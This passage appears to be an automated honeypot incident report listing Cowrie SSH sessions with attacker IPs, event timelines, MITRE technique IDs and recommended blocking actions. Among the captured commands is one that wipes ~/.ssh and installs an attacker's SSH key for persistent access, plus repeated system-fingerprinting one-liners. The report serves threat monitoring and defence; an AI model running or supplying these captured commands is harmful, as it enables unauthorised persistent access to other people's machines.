| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:59:37` | `cowrie.session.connect` |
| `2026-07-17 16:59:37` | `cowrie.client.version` |
| `2026-07-17 16:59:37` | `cowrie.client.kex` |
| `2026-07-17 16:59:37` | `cowrie.login.success` |
| `2026-07-17 16:59:37` | `cowrie.session.params` |
| `2026-07-17 16:59:37` | `cowrie.command.input` |
| `2026-07-17 16:59:37` | `cowrie.command.failed` |
| `2026-07-17 16:59:37` | `cowrie.log.closed` |
| `2026-07-17 16:59:38` | `cowrie.session.params` |
| `2026-07-17 16:59:38` | `cowrie.command.input` |
| `2026-07-17 16:59:38` | `cowrie.session.file_download` |
| `2026-07-17 16:59:38` | `cowrie.log.closed` |
| `2026-07-17 16:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.49.246[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.49.246[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-482d6bf94a97

| Field | Detail |
|---|---|
| **Source IP** | `69.49.246[.]176` |
| **First Seen** | 2026-07-17 16:59 |
| **Last Seen** | 2026-07-17 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:59:38` | `cowrie.session.connect` |
| `2026-07-17 16:59:38` | `cowrie.client.version` |
| `2026-07-17 16:59:38` | `cowrie.client.kex` |
| `2026-07-17 16:59:38` | `cowrie.login.success` |
| `2026-07-17 16:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.49.246[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.49.246[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1acdb0ac5cf

| Field | Detail |
|---|---|
| **Source IP** | `69.49.246[.]176` |
| **First Seen** | 2026-07-17 16:59 |
| **Last Seen** | 2026-07-17 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:59:38` | `cowrie.session.connect` |
| `2026-07-17 16:59:38` | `cowrie.client.version` |
| `2026-07-17 16:59:38` | `cowrie.client.kex` |
| `2026-07-17 16:59:38` | `cowrie.login.success` |
| `2026-07-17 16:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.49.246[.]176` to AbuseIPDB if not already reported
- [ ] Block `69.49.246[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dbea8e5733f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 16:59 |
| **Last Seen** | 2026-07-17 16:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 16:59:46` | `cowrie.session.connect` |
| `2026-07-17 16:59:47` | `cowrie.client.version` |
| `2026-07-17 16:59:47` | `cowrie.client.kex` |
| `2026-07-17 16:59:48` | `cowrie.login.success` |
| `2026-07-17 16:59:49` | `cowrie.session.params` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.success` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:49` | `cowrie.command.input` |
| `2026-07-17 16:59:50` | `cowrie.log.closed` |
| `2026-07-17 16:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a7d4552733

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-17 17:00 |
| **Last Seen** | 2026-07-17 17:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:00:42` | `cowrie.session.connect` |
| `2026-07-17 17:00:42` | `cowrie.client.version` |
| `2026-07-17 17:00:42` | `cowrie.client.kex` |
| `2026-07-17 17:00:44` | `cowrie.login.success` |
| `2026-07-17 17:00:44` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1b896739bc4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:01 |
| **Last Seen** | 2026-07-17 17:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:01:21` | `cowrie.session.connect` |
| `2026-07-17 17:01:21` | `cowrie.client.version` |
| `2026-07-17 17:01:21` | `cowrie.client.kex` |
| `2026-07-17 17:01:23` | `cowrie.login.success` |
| `2026-07-17 17:01:24` | `cowrie.session.params` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.success` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.command.input` |
| `2026-07-17 17:01:24` | `cowrie.log.closed` |
| `2026-07-17 17:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fdcd1f1ef51

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:02 |
| **Last Seen** | 2026-07-17 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:02:59` | `cowrie.session.connect` |
| `2026-07-17 17:02:59` | `cowrie.client.version` |
| `2026-07-17 17:02:59` | `cowrie.client.kex` |
| `2026-07-17 17:02:59` | `cowrie.login.success` |
| `2026-07-17 17:03:00` | `cowrie.session.params` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.success` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:00` | `cowrie.command.input` |
| `2026-07-17 17:03:01` | `cowrie.log.closed` |
| `2026-07-17 17:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a39ec9edf02

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:04 |
| **Last Seen** | 2026-07-17 17:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:04:48` | `cowrie.session.connect` |
| `2026-07-17 17:04:49` | `cowrie.client.version` |
| `2026-07-17 17:04:49` | `cowrie.client.kex` |
| `2026-07-17 17:04:50` | `cowrie.login.success` |
| `2026-07-17 17:04:51` | `cowrie.session.params` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.success` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.command.input` |
| `2026-07-17 17:04:51` | `cowrie.log.closed` |
| `2026-07-17 17:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ff3fe06c2a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:06 |
| **Last Seen** | 2026-07-17 17:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:06:36` | `cowrie.session.connect` |
| `2026-07-17 17:06:36` | `cowrie.client.version` |
| `2026-07-17 17:06:36` | `cowrie.client.kex` |
| `2026-07-17 17:06:37` | `cowrie.login.success` |
| `2026-07-17 17:06:38` | `cowrie.session.params` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.success` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:38` | `cowrie.command.input` |
| `2026-07-17 17:06:39` | `cowrie.log.closed` |
| `2026-07-17 17:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e737ffeba5ca

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:08 |
| **Last Seen** | 2026-07-17 17:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:08:33` | `cowrie.session.connect` |
| `2026-07-17 17:08:33` | `cowrie.client.version` |
| `2026-07-17 17:08:33` | `cowrie.client.kex` |
| `2026-07-17 17:08:33` | `cowrie.login.success` |
| `2026-07-17 17:08:34` | `cowrie.session.params` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.success` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.command.input` |
| `2026-07-17 17:08:34` | `cowrie.log.closed` |
| `2026-07-17 17:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d178b8a45735

| Field | Detail |
|---|---|
| **Source IP** | `111.70.39[.]214` |
| **First Seen** | 2026-07-17 17:09 |
| **Last Seen** | 2026-07-17 17:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:09:05` | `cowrie.session.connect` |
| `2026-07-17 17:09:06` | `cowrie.client.version` |
| `2026-07-17 17:09:06` | `cowrie.client.kex` |
| `2026-07-17 17:09:08` | `cowrie.login.success` |
| `2026-07-17 17:09:09` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.39[.]214` to AbuseIPDB if not already reported
- [ ] Block `111.70.39[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba94b671b9cb

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-07-17 17:09 |
| **Last Seen** | 2026-07-17 17:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:09:14` | `cowrie.session.connect` |
| `2026-07-17 17:09:14` | `cowrie.client.version` |
| `2026-07-17 17:09:14` | `cowrie.client.kex` |
| `2026-07-17 17:09:15` | `cowrie.login.success` |
| `2026-07-17 17:09:16` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2e5012a47d0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-17 17:10 |
| **Last Seen** | 2026-07-17 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:10:39` | `cowrie.session.connect` |
| `2026-07-17 17:10:39` | `cowrie.client.version` |
| `2026-07-17 17:10:39` | `cowrie.client.kex` |
| `2026-07-17 17:10:40` | `cowrie.login.success` |
| `2026-07-17 17:10:40` | `cowrie.session.params` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.success` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:40` | `cowrie.command.input` |
| `2026-07-17 17:10:41` | `cowrie.log.closed` |
| `2026-07-17 17:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da87c896ed9

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:10 |
| **Last Seen** | 2026-07-17 17:11 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:10:41` | `cowrie.session.connect` |
| `2026-07-17 17:10:42` | `cowrie.login.success` |
| `2026-07-17 17:10:43` | `cowrie.session.params` |
| `2026-07-17 17:10:43` | `cowrie.command.input` |
| `2026-07-17 17:10:43` | `cowrie.command.failed` |
| `2026-07-17 17:10:43` | `cowrie.command.input` |
| `2026-07-17 17:10:43` | `cowrie.command.failed` |
| `2026-07-17 17:10:44` | `cowrie.command.input` |
| `2026-07-17 17:10:44` | `cowrie.command.failed` |
| `2026-07-17 17:10:44` | `cowrie.command.input` |
| `2026-07-17 17:10:44` | `cowrie.command.failed` |
| `2026-07-17 17:10:45` | `cowrie.command.input` |
| `2026-07-17 17:10:45` | `cowrie.command.input` |
| `2026-07-17 17:10:45` | `cowrie.command.failed` |
| `2026-07-17 17:10:45` | `cowrie.command.failed` |
| `2026-07-17 17:11:16` | `cowrie.log.closed` |
| `2026-07-17 17:11:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a47dab923f6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 17:11 |
| **Last Seen** | 2026-07-17 17:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:11:06` | `cowrie.session.connect` |
| `2026-07-17 17:11:06` | `cowrie.client.version` |
| `2026-07-17 17:11:06` | `cowrie.client.kex` |
| `2026-07-17 17:11:07` | `cowrie.login.success` |
| `2026-07-17 17:11:07` | `cowrie.direct-tcpip.request` |
| `2026-07-17 17:11:07` | `cowrie.direct-tcpip.data` |
| `2026-07-17 17:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d196fe7a1e04

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:11 |
| **Last Seen** | 2026-07-17 17:11 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 17:11:16` | `cowrie.session.connect` |
| `2026-07-17 17:11:17` | `cowrie.login.success` |
| `2026-07-17 17:11:17` | `cowrie.session.params` |
| `2026-07-17 17:11:18` | `cowrie.command.input` |
| `2026-07-17 17:11:18` | `cowrie.command.failed` |
| `2026-07-17 17:11:18` | `cowrie.command.input` |
| `2026-07-17 17:11:18` | `cowrie.command.failed` |
| `2026-07-17 17:11:18` | `cowrie.command.input` |
| `2026-07-17 17:11:18` | `cowrie.command.failed` |
| `2026-07-17 17:11:19` | `cowrie.command.input` |
| `2026-07-17 17:11:19` | `cowrie.command.failed` |
| `2026-07-17 17:11:19` | `cowrie.command.input` |
| `2026-07-17 17:11:19` | `cowrie.command.input` |
| `2026-07-17 17:11:19` | `cowrie.command.failed` |
| `2026-07-17 17:11:19` | `cowrie.command.failed` |
| `2026-07-17 17:11:50` | `cowrie.log.closed` |
| `2026-07-17 17:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dd354b8f95d

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-07-17 17:11 |
| **Last Seen** | 2026-07-17 17:12 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
